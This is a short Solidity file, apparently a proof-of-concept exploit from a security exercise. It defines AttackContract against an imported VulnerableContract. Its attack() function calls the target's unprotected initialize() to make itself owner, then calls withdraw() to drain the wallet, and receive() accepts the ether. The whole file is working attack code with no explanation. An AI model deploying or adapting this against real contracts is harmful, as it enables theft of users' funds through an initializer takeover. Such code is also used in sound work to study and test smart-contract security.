// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableContract.sol";

contract AttackContract {
    VulnerableContract public wallet;

    constructor(address payable _wallet) {
        wallet = VulnerableContract(_wallet);
    }

    function attack() public {
        wallet.initialize(address(this));
        wallet.withdraw();
    }

    receive() external payable {}
}